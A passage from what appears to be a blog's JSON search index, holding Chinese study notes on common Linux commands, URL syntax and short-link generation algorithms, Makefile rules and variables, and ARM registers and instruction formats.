作用：查看目录的真实大小\n语法：#du\t-sh\t目录路径 选项含义：\n​\t-s：summaries，只显示汇总的大小\n​\t-h：表示以高可读性的形式进行显示\n28.find指令 作用：用于查找文件（参数贼多，55个）\n语法：#find\t路径范围\t选项\t选项的值 选项：\n​\t-name：按照文件名称进行搜索（支持模糊搜索）\n​\t-type：按照文件的类型进行搜索（文件类型：“-”表示文件，在使用find的使用需要用f来替换；“d”表示文件夹）\n注：*为通配符，匹配所有字符\n29.service指令 作用：用于控制一些软件的服务启动、停止、重启\n语法：#service\t服务名\tstart/stop/restart 例：启动本机安装的Apache，其服务名为httpd\n 其服务启动规则可自己编写，后续将会专门开一篇讲述  30.kill指令 作用：表示杀死进程（当遇到僵尸进程或者处于某些原因需要关闭进程的时候）\n语法：#kill\t进程的PID（需要配合ps一起使用） 与kill相似的命令：#killall\n语法：#killall\t进程名称 31.ifconfig指令 作用：用于操作网卡相关的指令\n语法：#ifconfig（获取网卡信息）\n注意该命令在windows环境下为ipconfig\nEth0表示Linux中的一个网卡，eth0是其名称。Lo（loop，本地回还网卡，其ip地址一般都是127.0.0.1）也是一个网卡名称。注意：inet addr就是网卡的ip地址。\n32.reboot指令 作用：重启计算机\n语法1：#reboot 重启\n语法2：#reboot\t-w 模拟重启，但是不重启（只写关机与开机的日志信息）\n33.shutdown指令 作用：关机（慎用）\n语法1：#shutdown\t-h\tnow\t\"关机提示\" #shutdown\t-h\ttime(14:41)\t\"关机提示\" 如果想要取消关机计划的话，则可以按照以下方式去尝试：\n①针对于centos7.x之前的版本：ctrl+c\n②针对于centos7.x（包含）之后的版本：#shutdown -c\n 除了shutdown关机以外，还有以下几个关机命令\n#init\t0\n#halt\n#poweroff\n 34.uptime指令 作用：输出计算机的持续在线时间（计算机从开机到现在运行的时间）\n语法：#uptime 35.uname指令 作用：获取计算机操作系统的相关信息\n语法1：#uname 获取操作系统类型\n语法2：#uname\t-a -a：表示all，表示获取全部的系统信息（类型、全部主机名、内核版本、发布时间、开源计划）\n36.netstat\t-tnlp指令 作用：查看网络连接状态\n语法：#netstat\t-tnlp 1 2 3 4 5  选项说明： -t：表示只列出tcp协议的连接； -n：表示将地址从字母组合转化成ip地址，将协议转化成端口号来显示； -l：表示过滤出“state（状态）”列中其值为LISTEN（监听）的连接； -p：表示显示发起连接的进程pid和进程名称；   37.man指令 作用：manual，手册（包含了Linux中全部的命令手册，英文）\n语法：#man\t命令 退出按下q键\n例：#man\tcp\n编辑器之神——Vim编辑器 ","description":"","tags":["linux","studyNote"],"title":"Linux Note","uri":"/posts/linux-note/"},{"categories":["network"],"content":"URL  引用：\nurl_Wiki\n短链接原理分析\n短链接的算法\n 统一资源定位符（英语：Uniform Resource Locator） 统一资源定位符（英语：Uniform Resource Locator，缩写：URL；或称统一资源定位器、定位地址、URL地址，俗称网页地址或简称网址）是因特网上标准的资源的地址（Address），如同在网络上的门牌。它最初是由蒂姆·伯纳斯-李发明用来作为万维网的地址，现在它已经被[万维网联盟4编制为因特网标准RFC 1738。\n在互联网的历史上，统一资源定位符的发明是一个非常基础的步骤。统一资源定位符的语法是一般的，可扩展的，它使用美国信息交换标准代码的一部分来表示因特网的地址。统一资源定位符的开始，一般会标志着一个计算机网络所使用的网络协议。\n统一资源定位符的标准格式如下：\n[协议类型]: //服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID [protocol]://server_address:port/path_and_filename?search#fragmentID 统一资源定位符的完整格式如下：\n[协议类型]: //访问资源需要的凭证信息@服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID 其中[访问凭证信息]、[端口号]、[查询]、[片段ID]都属于选填项。\n语法 超文本传输协议（http）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中：\n 传送协议。 层级URL标记符号(为[//],固定不变) 访问资源需要的凭证信息（可省略） 服务器。（通常为域名，有时为IP地址） 端口号。（以数字方式表示，若为默认值可省略） 路径。（以“/”字符区别路径中的每一个目录名称） 查询。（GET模式的窗体参数，以“?”字符为起点，每个参数以“\u0026”隔开，再以“=”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题） 片段。以“#”字符为起点  以http://zh.wikipedia.org:80/w/index.php?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2 为例, 其中：\n http，是协议； zh.wikipedia.org，是服务器； 80，是服务器上的网络端口号； /w/index.php，是路径； ?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2，是询问。  大多数网页浏览器不要求用户输入网页中“http://”的部分，因为绝大多数网页内容是超文本传输协议文件。同样，“80”是超文本传输协议文件的常用端口号，因此一般也不必写明。一般来说用户只要键入统一资源定位符的一部分（zh.wikipedia.org/wiki/Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2）就可以了。\n由于超文本传输协议允许服务器将浏览器重定向到另一个网页地址，因此许多服务器允许用户省略网页地址中的部分，比如 www。从技术上来说这样省略后的网页地址实际上是一个不同的网页地址，浏览器本身无法决定这个新地址是否通，服务器必须完成重定向的任务\n短链接 短链接本质上是http协议中的重定向内容，一般为http301和http302\n短链接的优势：简短、美观、便于传播\n原理 例如短链接 http://qnr.io/j6Dcss\n DNS解析qnr.io域名，发送GET请求 /j6Dcss 服务器会通过短码获取对应的原URL 然后通过 HTTP 302 （或HTTP 301）转到对应的原URL  常见算法实现 自增序列算法 短址的长度一般设为 6 位，而每一位是由 [a - z, A - Z, 0 - 9] 总共 62 个字母组成的，所以 6 位的话，总共会有 62^6 ~= 568亿种组合，一般肯定是够用了。 将原网址分配一个从1位到6位的随机短码，存数据库记录，对返回的id进行62进制转码。\n即可使用发号策略。发号策略是这样的，当一个新的链接过来时，发号器发一个号与之对应。往后只要有新链接过来，发号器不停发号就好。举个例子，第一个进来的链接发号器发0号，对应的短链接为 xx.xxx/0，第二个进来的链接发号器发1号，对应的短链接为 xx.xxx/1，以此类推。 发号器发出的10进制号需要转换成62进制，这样可以大大缩短号码转换成字符串后的长度。比如发号器发出 10,000,000,000 这个号码，如果不转换成62进制，直接拼接在域名后面，得到这样一个链接 xx.xxx/10000000000。将上面的号码转换成62进制，结果为AOYKUa，长度只有6位，拼接得到的链接为 xx.xxx/AOYKUa。可以看得出，进制转换后得到的短链接长度变短了一些。6位62进制数，对应的号码空间为626，约等于568亿。也就是说发号器可以发568亿个号，这个号码空间应该能够满足多数项目的需求了，所以基本上不用担心发号器无号可发的情况。上述是发号策略压缩URL的原理，在实际写代码的过程中还需要考虑很多细节，比如缓存，存储等。\n摘要算法 将原网址 md5 生成 32 位签名串,分为 4 段, 每段 8 个字节 对这四段循环处理, 取 8 个字节, 将他看成 16 进制串与0x3fffffff(30位1) 与操作, 即超过 30 位的忽略处理 这 30 位分成 6 段, 每 5位的数字作为字母表的索引取得特定字符, 依次进行获得 6 位字符串 总的 md5 串可以获得 4 个 6位串,取里面的任意一个就可作为这个长 url 的短 url 地址 这种算法,虽然会生成4个,但是仍然存在重复几率\n算法比较 第一种算法的好处就是简单好理解，永不重复。但是短码的长度不固定，随着 id 变大从一位长度开始递增。如果非要让短码长度固定也可以就是让 id 从指定的数字开始递增就可以了。\n第二种算法，虽然几率很小，但是存在碰撞（重复）的可能性。短码位数是比较固定的。\nQ：同一长链接，每次转成的短链接是否一样 A：同一长链接，每次转成的短链接不一定一样，原因在于如果查询缓存时，如果未命中，发号器会发新号给这个链接。需要说明的是，缓存应该缓存经常转换的热门链接，假设设定缓存过期时间为一小时，如果某个链接很活跃的话，缓存查询命中后，缓存会刷新这个链接的存活时间，重新计时，这个链接就会长久存在缓存中。对于一些生僻链接，从存入缓存开始，在存活时间内很可能不会被再次访问，存活时间结束缓存会删除记录。下一次转换这个生僻链接，缓存不命中，发号器会重新发号。这样一来会导致一条长链接对应多条短链接的情况出现，不仅浪费存储空间，又浪费发号器资源。那么是否有办法解决这个问题呢？是不是可以考虑建立一个长链接-短链接的key-value表，将所有的长链接和对应的短链接都存入其中，这样一来就实现了长短链接一一对应的了。但是想法是美好的，现实是不行的，原因在于，将所有的长链接-短链接对存入这样的表中，本身就需要耗费大量的存储空间，相对于生僻链接可能会对应多条短链接浪费的那点空间，这样做显然就得不偿失了。\nHTTP 301与 302的区别 301 是永久重定向，302 是临时重定向。短地址一经生成就不会变化，所以用 301 是符合 http 语义的。同时对服务器压力也会有一定减少。用户第一次访问某个短链接后，如果服务器返回301状态码，则这个用户在后续多次访问统一短链接，浏览器会直接请求跳转地址，而不是短链接地址，这样一来服务器端就无法收到用户的请求。如果服务器返回302状态码，且告知浏览器不缓存短链接请求，那么用户每次访问短链接，都会先去短链接服务端取回长链接地址，然后在跳转。从语义上来说，301跳转更为合适，因为是永久跳转，不会每次都访问服务端，还可以减小服务端压力。但如果使用301跳转，服务端就无法精确搜集用户的访问行为了。相反302跳转会导致服务端压力增大，但服务端此时就可精确搜集用户的访问行为。 但是如果使用了 301，我们就无法统计到短地址被点击的次数了。而点收集击次数的意义那就不言而喻了，关键是现在服务器硬件设备都很好，还有支持高并发的NGINX，所以对服务器的压力几乎可以忽略，最终也就选择302。\n","description":"","tags":["url","tech"],"title":"url","uri":"/posts/url/"},{"categories":["c++"],"content":"Make  本文参考：\nGNU+make中文手册\nGNU+make原版官方手册\nmake wiki\nMakefile由浅入深\n跟我一起写Makefile\n 序 ​\t最初了解到Makefile，还是从很久很久以前说起。当时在老师底下做项目，要配置一个nginx服务器，当初给出教程是直接make\u0026\u0026make install就完事了，打完代码一行行执行下来看起来非常有成就感233333\n​\t但是之后在做计算机系统的实验时，才发现Makefile是如此的有用万能，无论是windows还是linux(ubuntu 16.04)下，只需要一个make就能解决编译链接安装问题，make完就能立即使用，实属好用。在之后的操作系统实验中，真正接触到了Makefile这东西，基本每个实验都要写Makefile，因此对Makefile的格式有了一个大概印象，但不过想深入了解一波，便去找了许多资料看。\n概述 在软件开发中，make是一个工具程序（Utility software），经由读取叫做“makefile”的文件，自动化建构软件。它是一种转化文件形式的工具，转换的目标称为“target”；与此同时，它也检查文件的依赖关系，如果需要的话，它会调用一些外部软件来完成任务。它的依赖关系检查系统非常简单，主要根据依赖文件的修改时间进行判断。大多数情况下，它被用来编译源代码，生成结果代码，然后把结果代码连接起来生成可执行文件或者库文件。它使用叫做“makefile”的文件来确定一个target文件的依赖关系，然后把生成这个target的相关命令传给shell去执行。\n许多现代软件的开发中（如Microsoft Visual Studio（他其实有提供一个vs 2017 交叉工具命令提示符，可以进行make，但不过一般在IDE中直接编译生成独有的工程配置文件）），集成开发环境已经取代make，但是在Unix环境中，仍然有许多任务程师采用make来协助软件开发。\nMakefile介绍 make命令执行时，需要一个makefile文件，以告诉make命令需要怎么样的去编译和链接程序。\n首先，我们用一个示例来说明makefile的书写规则，以便给大家一个感性认识。这个示例来源于gnu 的make使用手册，在这个示例中，我们的工程有8个c文件，和3个头文件，我们要写一个makefile来告 诉make命令如何编译和链接这几个文件。我们的规则是：\n 如果这个工程没有编译过，那么我们的所有c文件都要编译并被链接。 如果这个工程的某几个c文件被修改，那么我们只编译被修改的c文件，并链接目标程序。 如果这个工程的头文件被改变了，那么我们需要编译引用了这几个头文件的c文件，并链接目标程序。  只要我们的makefile写得够好，所有的这一切，我们只用一个make命令就可以完成，make命令会自动智能 地根据当前的文件修改的情况来确定哪些文件需要重编译，从而自动编译所需要的文件和链接目标程序。\nMakefile规则 1 2 3 4 5 6 7 8  #Makefile中，用#表示注释 target ...:\tprerequisites\t... command 1 #注意命令前要用Tab command 2 ... ... #可以使用“\\”表示续行，但是“\\”之后不能有空格     target\n可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。对 于标签这种特性，在后续的“伪目标”章节中会有叙述。\n  prerequisites\n生成该target所依赖的文件和/或target\n  command\n该target要执行的命令（任意的shell命令）\n  这是一个文件的依赖关系，也就是说，target这一个或多个的目标文件依赖于prerequisites中的文件， 其生成规则定义在command中。说白一点就是说:\nprerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。\n这就是Makefile中最核心的规则。\n实例 采用GNU make 手册中的例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  edit : main.o kbd.o command.o display.o \\ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o main.o : main.c defs.h cc -c main.c kbd.o : kbd.c defs.h command.h cc -c kbd.c command.o : command.c defs.h command.h cc -c command.c display.o : display.c defs.h buffer.h cc -c display.c insert.o : insert.c defs.h buffer.h cc -c insert.c search.o : search.c defs.h buffer.h cc -c search.c files.o : files.c defs.h buffer.h command.h cc -c files.c utils.o : utils.c defs.h cc -c utils.c clean : rm edit main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o   该工程有3个头文件和8个c文件\n其中反斜杠(“\\”)是换行符，注意换行符之后不能用空格。换行符又利用Makefile的阅读。\n把Makefile放在处于工程下的，然后在该目录下输入make命令，就可以生成可执行文件了。如果要删除执行文件和所有的中间目标文件，那么只需要执行make clean就可以了。\n在这个makefile中，目标文件（target）包含：执行文件edit和中间目标文件（ *.o ），依赖文 件（prerequisites）就是冒号后面的那些 .c 文件和 .h 文件。每一个 .o 文件都有 一组依赖文件，而这些 .o 文件又是执行文件 edit 的依赖文件。依赖关系的实质就是说明了目 标文件是由哪些文件生成的，换言之，目标文件是哪些文件更新的。\n这里要说明一点的是， clean 不是一个文件，它只不过是一个动作名字，有点像c语言中的label一 样，其冒号后什么也没有，那么，make就不会自动去找它的依赖性，也就不会自动执行其后所定义的命令。 要执行其后的命令，就要在make命令后明显得指出这个label的名字。这样的方法非常有用，我们可以在一 个makefile中定义不用的编译或是和编译无关的命令，比如程序的打包，程序的备份，等等。\nmake的执行过程如下：  依次读取变量“MAKEFILES”定义的makefile文件列表 读取工作目录下的makefile文件（GNU make的顺序：缺省的是根据命名的查找顺序“GNUmakefile”，“makefile”，“Makefile”，首先找到那个就读取那个（假如是MAKEFILE，需要用make -f）） 依次读取工作目录makefile文件中使用指示符“include”包含的文件 查找重建所有已读取的makefile文件的规则（如果存在一个目标是当前读取的某一个makefile文件，则执行此规则重建此makefile文件，完成以后从第一步开始重新执行） 初始化变量值并展开那些需要立即展开的变量和函数并根据预设条件确定执行分支 根据“终极目标”以及其他目标的依赖关系建立依赖关系链表 执行除“终极目标”以外的所有的目标的规则（规则中如果依赖文件中任一个文件的时间戳比目标文件新，则使用规则所定义的命令重建目标文件） 执行“终极目标”所在的规则  一上面那个工程为示例：\n在默认的方式下，也就是我们只输入 make 命令。那么， 1.make会在当前目录下找名字叫“Makefile”或“makefile”的文件。 2.如果找到，它会找文件中的第一个目标文件（target），在上面的例子中，他会找到“edit”这个 文件，并把这个文件作为最终的目标文件。 3.如果edit文件不存在，或是edit所依赖的后面的 .o 文件的文件修改时间要比 edit 这个 文件新，那么，他就会执行后面所定义的命令来生成 edit 这个文件。 4.如果 edit 所依赖的 .o 文件也不存在，那么make会在当前文件中找目标为 .o 文件 的依赖性，如果找到则再根据那一个规则生成 .o 文件。（这有点像一个堆栈的过程） 5.当然，你的C文件和H文件是存在的啦，于是make会生成 .o 文件，然后再用 .o 文件生 成make的终极任务，也就是执行文件 edit 了。 这就是整个make的依赖性，make会一层又一层地去找文件的依赖关系，直到最终编译出第一个目标文件。在 找寻的过程中，如果出现错误，比如最后被依赖的文件找不到，那么make就会直接退出，并报错，而对于所定义的命令的错误，或是编译不成功，make根本不理。make只管文件的依赖性。\n像 clean 这种，没有被第一个目标文件直接或间接关联，那么它后面所定义的命 令将不会被自动执行，不过，我们可以显示要make执行。即命令—— make clean ，以此来清除所有 的目标文件，以便重编译。\n如果这个工程已被编译过了，当我们修改了其中一个源文件，比如 file.c ， 那么根据我们的依赖性，我们的目标 file.o 会被重编译（也就是在这个依性关系后面所定义的命令）， 于是 file.o 的文件也是最新的啦，于是 file.o 的文件修改时间要比 edit 要新，所 以 edit 也会被重新链接了（详见 edit 目标文件后定义的命令）。比如我们改变了 command.h ，那么， kdb.o 、 command.o 和 files.o 都 会被重编译，并且， edit 会被重链接。\nMakefile中使用变量 总所周知，变量是个好东西0.0\n在Makefile中使用变量有利于我们对其有更好的维护性。\n跟通常编程一样，变量名最好简(jian)洁(dan)易(cu)懂(bao)，有利于人们明白其代表的含义。\n在上面例子中，edit后面的一串便可以进行替代了。\n1 2 3 4  edit : main.o kbd.o command.o display.o \\ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o   当我们需要添加文件时，需要修改多个地方，使用变量能很好地为我们节省时间。\n只需在前面声明变量就好，比如objects，objs，obj等等，只要能很好明白其代表的含义就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  objs = main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o edit : $(objs) cc -o edit $(objs) main.o : main.c defs.h cc -c main.c kbd.o : kbd.c defs.h command.h cc -c kbd.c command.o : command.c defs.h command.h cc -c command.c display.o : display.c defs.h buffer.h cc -c display.c insert.o : insert.c defs.h buffer.h cc -c insert.c search.o : search.c defs.h buffer.h cc -c search.c files.o : files.c defs.h buffer.h command.h cc -c files.c utils.o : utils.c defs.h cc -c utils.c clean : rm edit $(objs)   比如这样，当我们需要添加新的 .o 文件的时候，只需要修改objs =\t... 就行了\nMakefile的自动推导 GNU的make可以自动推到文件及文件依赖关系后面的命令，于是我们就没必要去在每一个 .o 文件后都写上类似的命令，因为，我们的make会自动识别，并自己推导命令。\n只要make看到一个 .o 文件，它就会自动的把 .c 文件加在依赖关系中，如果make找到一个whatever.o ，那么 whatever.c 就会是 whatever.o 的依赖文件。并且 cc -c whatever.c 也会被推导出来，于是，我们的makefile再也不用写得这么复杂。我们的 新makefile又出炉了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  objects = main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o edit : $(objects) cc -o edit $(objects) main.o : defs.h kbd.o : defs.h command.h command.o : defs.h command.h display.o : defs.h buffer.h insert.o : defs.h buffer.h search.o : defs.h buffer.h files.o : defs.h buffer.h command.h utils.o : defs.h .PHONY : clean clean : rm edit $(objects)   这种方法，也就是make的“隐晦规则”。\n.PHONY 表示 clean 是个伪目标 文件。\n另类风格的Makefile 既然我们的make可以自动推导命令，那么我看到那堆 .o 和 .h 的依赖就有点不爽，那么多的 重复的 .h ，能不能把其收拢起来，好吧，没有问题，这个对于make来说很容易，谁叫它提供了自动 推导命令和文件的功能呢？来看看最新风格的makefile吧。\n1 2 3 4 5 6 7 8 9 10 11 12 13  objects = main.o kbd.o command.o display.o \\  insert.o search.o files.o utils.o edit : $(objects) cc -o edit $(objects) $(objects) : defs.h kbd.o command.o files.o : command.h display.o insert.o search.o files.o : buffer.h .PHONY : clean clean : rm edit $(objects)   清空目标文件的规则 每个Makefile中都应该写一个清空目标文件（ .o 和执行文件）的规则，这不仅便于重编译，也很 利于保持文件的清洁。\n1 2  clean: rm edit $(objects)   更为稳健的做法是：\n1 2 3  .PHONY : clean clean : -rm edit $(objects)   前面说过， .PHONY 表示 clean 是一个“伪目标”。而在 rm 命令前面加了一个小减号的 意思就是，也许某些文件出现问题，但不要管，继续做后面的事。当然， clean 的规则不要放在文件 的开头，不然，这就会变成make的默认目标，相信谁也不愿意这样。不成文的规矩是——“clean从来都是放 在文件的最后”。\nMakefile里有什么？ Makefile里主要包含了五个东西：显式规则、隐晦规则、变量定义、文件指示和注释。\n  显式规则。显式规则说明了如何生成一个或多个目标文件。这是由Makefile的书写者明显指出要生成的 文件、文件的依赖文件和生成的命令。\n  隐晦规则。由于我们的make有自动推导的功能，所以隐晦的规则可以让我们比较简略地书写 Makefile，这是由make所支持的。\n  变量的定义。在Makefile中我们要定义一系列的变量，变量一般都是字符串，这个有点像你C语言中的 宏，当Makefile被执行时，其中的变量都会被扩展到相应的引用位置上。\n  文件指示。其包括了三个部分，一个是在一个Makefile中引用另一个Makefile，就像C语言中 的include一样；另一个是指根据某些情况指定Makefile中的有效部分，就像C语言中的预编译#if一 样；还有就是定义一个多行的命令。有关这一部分的内容，我会在后续的部分中讲述。\n  注释。Makefile中只有行注释，和UNIX的Shell脚本一样，其注释是用 # 字符，这个就 像C/C++中的 // 一样。如果你要在你的Makefile中使用 # 字符，可以用反斜杠进行转义，如： \\# 。\n还有的就是在Makefile中的命令，必须要以 Tab 键开始。\n  Makefile的文件名 因为make程序已被用户多次重/改写，其中包括几次用相同的文件格式和算法原理重新编写，并且依照不同需要添加了一些不常见的改良。\n现在的版本，大致是 GNU make，BSD make，Microsoft nmake。\n默认的情况下，gnu的make命令会在当前目录下按顺序找寻文件名为“GNUmakefile”、 “makefile”、“Makefile”的文件，找到了解释这个文件。在这三个文件名中，最好使用“Makefile” 这个文件名，因为，这个文件名第一个字符为大写，这样有一种显目的感觉。最好不要用“GNUmakefile”， 这个文件是GNU的make识别的。有另外一些make只对全小写的“makefile”文件名敏感，但是基本上来说， 大多数的make都支持“makefile”和“Makefile”这两种默认文件名。\n当然，你可以使用别的文件名来书写Makefile，比如：“Make.Linux”，“Make.Solaris” ，“Make.AIX”等，如果要指定特定的Makefile，你可以使用make的 -f 和 --file 参数， 如： make -f Make.Linux 或 make --file Make.AIX 。\n引用其他的Makefile 在Makefile使用 include 关键字可以把别的Makefile包含进来，这很像C语言的 #include ，被包含的文件会原模原样的放在当前文件的包含位置。 include 的语法是：\n1  include \u003cfilename\u003e   filename 可以是当前操作系统Shell的文件模式（可以包含路径和通配符）。\n在 include 前面可以有一些空字符，但是绝不能是 Tab 键开始。 include 和 \u003cfilename\u003e 可以用一个或多个空格隔开。举个例子，你有这样几个Makefile： a.mk 、 b.mk 、 c.mk ，还有一个文件叫 foo.make ，以及一个变量 $(bar) ，其包含 了 e.mk 和 f.mk ，那么，下面的语句：\n1 2  bar\t=\te.mk\tf.mk include foo.make *.mk $(bar)   等价于：\n1  include foo.make a.mk b.mk c.mk e.mk f.mk   make命令开始时，会找寻 include 所指出的其它Makefile，并把其内容安置在当前的位置。就好 像C/C++的 #include 指令一样。如果文件都没有指定绝对路径或是相对路径的话，make会在当前目 录下首先寻找，如果当前目录下没有找到，那么，make还会在下面的几个目录下找：\n 如果make执行时，有 -I 或 --include-dir 参数，那么make就会在这个参数所指定的目 录下去寻找。 如果目录 \u003cprefix\u003e/include （一般是： /usr/local/bin 或 /usr/include ）存在的话，make也会去找。  如果有文件没有找到的话，make会生成一条警告信息，但不会马上出现致命错误。它会继续载入其它的 文件，一旦完成makefile的读取，make会再重试这些没有找到，或是不能读取的文件，如果还是 不行，make才会出现一条致命信息。如果你想让make不理那些无法读取的文件，而继续执行，你可以 在include前加一个减号“-”。如：\n-include \u003cfilename\u003e 其表示，无论include过程中出现什么错误，都不要报错继续执行。和其它版本make兼容的相关命令 是sinclude，其作用和这一个是一样的。\n环境变量MAKEFILES 如果你的当前环境中定义了环境变量 MAKEFILES ，那么，make会把这个变量中的值做一个类似于include 的动作。这个变量中的值是其它的Makefile，用空格分隔。只是，它和 include 不 同的是，从这个环境变量中引入的Makefile的“目标”不会起作用，如果环境变量中定义的文件发现 错误，make也会不理。\n但是在这里我还是建议不要使用这个环境变量，因为只要这个变量一被定义，那么当你使用make时， 所有的Makefile都会受到它的影响，这绝不是你想看到的。在这里提这个事，只是为了告诉大家，也许 有时候你的Makefile出现了怪事，那么你可以看看当前环境中有没有定义这个变量。\nmake的工作流程 GNU的make工作时的执行步骤如下：（想来其它的make也是类似）\n 读入所有的Makefile。 读入被include的其它Makefile。 初始化文件中的变量。 推导隐晦规则，并分析所有规则。 为所有的目标文件创建依赖关系链。 根据依赖关系，决定哪些目标要重新生成。 执行生成命令。  1-5步为第一个阶段，6-7为第二个阶段。第一个阶段中，如果定义的变量被使用了，那么，make会把其展 开在使用的位置。但make并不会完全马上展开，make使用的是拖延战术，如果变量出现在依赖关系的规则 中，那么仅当这条依赖被决定要使用了，变量才会在其内部展开。\n当然，这个工作方式你不一定要清楚，但是知道这个方式你也会对make更为熟悉。有了这个基础，后续部分 也就容易看懂了。\n书写规则 ","description":"","tags":["c++","make"],"title":"Makefile","uri":"/posts/makefile/"},{"categories":["arm"],"content":"ARM指令集详解  引用：\nARM指令集详解\n 1. 汇编 1.1. 通用寄存器   寄存器类别 寄存器在汇编中的名称 各模式下实际访问的寄存器           用户 系统 管理 中止 未定义 中断 快中断   通用寄存器和程序计数器 R0(a1) R0          R1(a2) R1          R2(a3) R2          R3(a4) R3          R4(v1) R4          R5(v2) R5          R6(v3) R6          R7(v4) R7          R8(v5) R8      R8_fiq *    R9(SB,v6) R9      R9_fiq *    R10(SL,v7) R10      R10_fiq *    R11(FP,v8) R11      R11_fiq *    R12(IP) R12      R12_fiq *    R13(SP) R13  R13_svc* R13_abt * R13_und * R13_irq * R13_fiq *    R14(LR) R14  R14_svc * R14_abt * R14_und * R14_irq * R14_fiq *    R15(PC) R15         状态寄存器 R16(CPSR) CPSR          SPSR 无  SPSR_svc SPSR_abt SPSR_und SPSR_irq SPSR_fiq      通用寄存器\n37个寄存器，31个通用寄存器，6个状态寄存器。\nR12是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。在过程调用之间，可以将它用于任何用途。被调用函数在返回之前不必恢复 r12。\nR13堆栈指针sp，R14返回指针，R15为PC指针, cpsr_c代表的是这32位中的低8位，也就是控制位\nCPSR有4个8位区域：标志域（F）、状态域（S）、扩展域（X）、控制域（C） MSR - Load specified fields of the CPSR or SPSR with an immediate constant, orfrom the contents of a general-purpose register. Syntax: MSR{cond} _, #immed_8rMSR{cond} _, Rm where: cond is an optional condition code. is either CPSR orSPSR. specifies the field or fields to be moved. can be one or more of: ccontrol field mask byte (PSR[7:0]) x extension field mask byte (PSR[15:8]) sstatus field mask byte (PSR[23:16) f flags field mask byte (PSR[31:24]).immed_8r is an expression evaluating to a numeric constant. The constant mustcorrespond to an 8-bit pattern rotated by an even number of bits within a32-bit word. Rm is the source register.\nC 控制域屏蔽字节(psr[7:0])\nX 扩展域屏蔽字节(psr[15:8])\nS 状态域屏蔽字节(psr[23:16])\nF 标志域屏蔽字节(psr[31:24])\nCPSR寄存器\nFIQ和IRQ的区别？\n   MODE(以下为二进制)  可见的ARM状态寄存器     10000 用户模式 PC,CPSR,R0~R14   10001 FIQ PC,CPSR,SPSR_fiq，R14_fiq~R8_fiq,R7~R0   10010 IRQ PC,CPSR,SPSR_irq，R14_irq~R13_irq,R12~R0   10011 管理模式(svc) PC,CPSR,SPSR_svc，R14_svc~R13_svc,R12~R0   10111 终止模式 PC,CPSR,SPSR_abt，R14_abt~R13_abt,R12~R0   11011 未定义 PC,CPSR,SPSR_und，R14_und~R13_und,R2~R0   11111 系统模式(sys) PC,CPSR，R14 ~R0    1.2. 指令格式  基本格式  ​  \u003copcode\u003e{\u003ccond\u003e}{S} \u003cRd\u003e,\u003cRn\u003e{,\u003copcode2\u003e}\n​ 其中，\u003c\u003e内的项是必须的，{}内的项是可选的，如是指令助记符，是必须的，而{}为指令执行条件，是可选的，如果不写则使用默认条件AL(无条件执行)。\n​ opcode 指令助记符，如LDR，STR 等\n​ cond 执行条件，如EQ，NE 等\n​ S 是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响\n​ Rd 目标寄存器\n​ Rn 第一个操作数的寄存器\n​ operand2 第二个操作数\n​ 指令格式举例如下：\n​ LDREX--这条指令主要是从memory中取一个数，然后放到register中，但是相比普通的LDR指令，在于其内在的原子操作特性, 信号量和spin lock这些东西最核心的事情基本上就是load-update-store序列，为了防止并发，必须保证这个序列是原子的，所谓原子，即处理器在执行这个指令序列时，得绝对占有处理器而不能够被切换出去。在ARM上，从V6开始，指令LDREX和STREX就是用来干这事的\n​ LDR R0,[R1] ;读取R1 地址上的存储器单元内容，执行条件AL ​ BEQ DATAEVEN ;跳转指令，执行条件EQ，即相等跳转到DATAEVEN ​ ADDS R1,R1,#1 ;加法指令，R1＋1＝R1 影响CPSR 寄存器，带有S ​ SUBNES R1,R1,#0xD;条件执行减法运算(NE)，R1-0xD=\u003eR1，影响CPSR 寄存器，带有S\n第2个操作数  ​ 在ARM 指令中，灵活的使用第2个操作数能提高代码效率，第2个操作数的形式如下：\n​ ＃immed_8r\n​ 常数表达式：\n​ 该常数必须对应8 位位图，即常数是由一个8 位的常数循环移位偶数位得到。\n​ 合法常量：\n​ 0x3FC、0、0xF0000000、200、0xF0000001等都是合法常量。\n​ 非法常量：\n​ 0x1FE、511、0xFFFF、0x1010、0xF0000010等都是非法常量。\n​\t常数表达式应用举例如下：\n​ MOV R0,#1 ;R0=1\n​ AND R1,R2,#0x0F ;R2 与0x0F，结果保存在R1\n​ LDR R0，[R1],#-4 ;读取R1 地址上的存储器单元内容，且R1＝R1－4\n​ Rm\n​ 寄存器方式，在寄存器方式下操作数即为寄存器的数值。\n​ 寄存器方式应用举例：\n​ SUB R1，R1，R2 ；R1-R2=＞R1\n​ MOV PC，R0 ；PC=R0，程序跳转到指定地址\n​ LDR R0，[R1]，-R2 ；读取R1 地址上的存储器单元内容并存入R0，且R1=R1-R2\n​ Rm， shift\n​ 寄存器移位方式。将寄存器的移位结果作为操作数，但RM 值保存不变，移位方法如下：\n​ ASR #n 算术右移n 位（1≤n≤32）\n​ LSL #n 逻辑左移n 位（1≤n≤31）\n​ LSR #n 逻辑左移n 位（1≤n≤32）\n​ ROR #n 循环右移n 位（1≤n≤31）\n​ RRX 带扩展的循环右移1位\n​ type Rs 其中，type 为ASR，LSL，和ROR 中的一种；Rs 偏移量寄存器，低8位有效，若其值大于或等于32，则第2 个操作数的结果为0（ASR、ROR例外）。 ​ 